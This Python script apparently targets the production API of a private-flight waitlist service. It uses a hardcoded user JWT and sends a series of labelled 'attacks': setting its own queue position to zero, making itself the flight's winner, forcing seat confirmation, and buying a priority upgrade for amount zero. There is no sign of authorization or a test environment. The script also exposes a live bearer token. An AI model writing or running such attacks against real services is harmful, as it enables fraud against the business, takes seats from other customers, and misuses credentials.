#!/usr/bin/env python3
"""
Test: Can we bump up waitlist position or force confirm seat?
Flight 8795: Tampa → Kissimmee (Current position: #3)
"""

import requests
import json
import time

PROD_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

FLIGHT_ID = 8795  # Tampa → Kissimmee flight
USER_ID = 20254

def make_request(method, endpoint, data=None):
    headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }
    
    url = f"{PROD_URL}{endpoint}"
    
    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=10)
        elif method == "PUT":
            r = requests.put(url, headers=headers, json=data, timeout=10)
        
        return {"status": r.status_code, "data": r.json() if r.text else None, "text": r.text[:300] if r.text else None}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def check_position():
    """Check current waitlist position on flight 8795"""
    r = make_request("GET", "/v1/flight/current")
    if r['status'] == 200 and r['data']:
        for flight in r['data']:
            if flight.get('id') == FLIGHT_ID:
                entrants = flight.get('entrants', [])
                for entrant in entrants:
                    if entrant.get('id') == USER_ID:
                        return {
                            'position': entrant.get('queuePosition'),
                            'winner': flight.get('winner'),
                            'confirmed': flight.get('isConfirmedByWinner', False)
                        }
    return None

print("="*80)
print("WAITLIST MANIPULATION TESTING - Flight 8795")
print("="*80)

baseline = check_position()
print(f"\n📊 Baseline:")
print(f"   Current position: #{baseline['position']}")
print(f"   Current winner: {baseline['winner']}")
print(f"   Winner confirmed: {baseline['confirmed']}")

print("\n" + "="*80)
print("TEST 1: BUMP UP WAITLIST POSITION")
print("="*80)

position_attacks = [
    {
        "name": "Set queuePosition to 0 (become #1)",
        "method": "PATCH",
        "endpoint": f"/v1/flight/{FLIGHT_ID}",
        "data": {"queuePosition": 0}
    },
    {
        "name": "Update user's queue position",
        "method": "PATCH",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/entrant",
        "data": {"userId": USER_ID, "queuePosition": 0}
    },
    {
        "name": "Update waitlist entry",
        "method": "PATCH",
        "endpoint": f"/v1/waitlist/{FLIGHT_ID}",
        "data": {"position": 0}
    },
    {
        "name": "Move to top via priority boost",
        "method": "POST",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/priority-boost",
        "data": None
    },
    {
        "name": "Request position upgrade",
        "method": "POST",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/upgrade",
        "data": {"newPosition": 0}
    },
]

print("\nTesting position manipulation...\n")

for attack in position_attacks:
    result = make_request(attack['method'], attack['endpoint'], attack['data'])
    
    if result['status'] == 200:
        print(f"✅ {attack['name']}")
        
        time.sleep(0.5)
        new_pos = check_position()
        
        if new_pos['position'] != baseline['position']:
            print(f"   🚨 POSITION CHANGED! {baseline['position']} → {new_pos['position']}")
            baseline = new_pos
        else:
            print(f"   ❌ No change (still position #{new_pos['position']})")
    
    elif result['status'] == 404:
        print(f"❌ {attack['name']} - Endpoint not found")
    else:
        print(f"❌ {attack['name']} - Status {result['status']}")

print("\n" + "="*80)
print("TEST 2: FORCE CONFIRM AS WINNER")
print("="*80)

winner_attacks = [
    {
        "name": "Set self as winner",
        "method": "PATCH",
        "endpoint": f"/v1/flight/{FLIGHT_ID}",
        "data": {"winner": USER_ID}
    },
    {
        "name": "Confirm as winner",
        "method": "POST",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/confirm",
        "data": None
    },
    {
        "name": "Accept flight offer",
        "method": "POST",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/accept",
        "data": None
    },
    {
        "name": "Claim winner seat",
        "method": "POST",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/claim",
        "data": None
    },
    {
        "name": "Book flight directly",
        "method": "POST",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/book",
        "data": None
    },
    {
        "name": "Confirm winner status",
        "method": "PATCH",
        "endpoint": f"/v1/flight/{FLIGHT_ID}",
        "data": {"isConfirmedByWinner": True, "winner": USER_ID}
    },
    {
        "name": "Force winner selection",
        "method": "POST",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/select-winner",
        "data": {"userId": USER_ID}
    },
]

print("\nTesting winner confirmation...\n")

for attack in winner_attacks:
    result = make_request(attack['method'], attack['endpoint'], attack['data'])
    
    if result['status'] == 200:
        print(f"✅ {attack['name']}")
        
        time.sleep(0.5)
        new_pos = check_position()
        
        if new_pos['winner'] == USER_ID:
            print(f"   🚨🚨🚨 YOU ARE NOW THE WINNER!")
            baseline = new_pos
        elif new_pos['confirmed'] != baseline['confirmed']:
            print(f"   ⚠️ Confirmation status changed: {baseline['confirmed']} → {new_pos['confirmed']}")
            baseline = new_pos
        else:
            print(f"   ❌ No change (winner still: {new_pos['winner']})")
    
    elif result['status'] == 404:
        print(f"❌ {attack['name']} - Endpoint not found")
    else:
        print(f"❌ {attack['name']} - Status {result['status']}")

print("\n" + "="*80)
print("TEST 3: WAITLIST UPGRADE PURCHASE")
print("="*80)

upgrade_attacks = [
    {
        "name": "Purchase priority upgrade",
        "method": "POST",
        "endpoint": f"/v1/flight/{FLIGHT_ID}/upgrade/purchase",
        "data": {"amount": 0}
    },
    {
        "name": "Apply waitlist upgrade",
        "method": "POST",
        "endpoint": f"/v1/waitlist/upgrade",
        "data": {"flightId": FLIGHT_ID}
    },
    {
        "name": "Use priority boost",
        "method": "POST",
        "endpoint": f"/v1/user/priority/boost",
        "data": {"flightId": FLIGHT_ID}
    },
]

print("\nTesting upgrade mechanisms...\n")

for attack in upgrade_attacks:
    result = make_request(attack['method'], attack['endpoint'], attack['data'])
    
    if result['status'] == 200:
        print(f"✅ {attack['name']}")
        print(f"   Response: {result['text']}")
        
        time.sleep(0.5)
        new_pos = check_position()
        
        if new_pos['position'] != baseline['position']:
            print(f"   🚨 POSITION IMPROVED! {baseline['position']} → {new_pos['position']}")
            baseline = new_pos
        else:
            print(f"   ❌ Still position #{new_pos['position']}")
    
    elif result['status'] == 404:
        print(f"❌ {attack['name']} - Not found")
    else:
        print(f"❌ {attack['name']} - Status {result['status']}")

# Final check
print("\n" + "="*80)
print("FINAL STATUS")
print("="*80)

final = check_position()
print(f"\nWaitlist position: #{final['position']}")
print(f"Winner: {final['winner']}")
print(f"Confirmed: {final['confirmed']}")

if final['winner'] == USER_ID:
    print("\n✅✅✅ SUCCESS! You are now the winner!")
elif final['position'] < baseline['position']:
    print(f"\n✅ Partial success - moved from #{baseline['position']} to #{final['position']}")
elif final['position'] == 0:
    print(f"\n✅ You are #1 in line!")
else:
    print(f"\n❌ No changes - still position #{final['position']}")
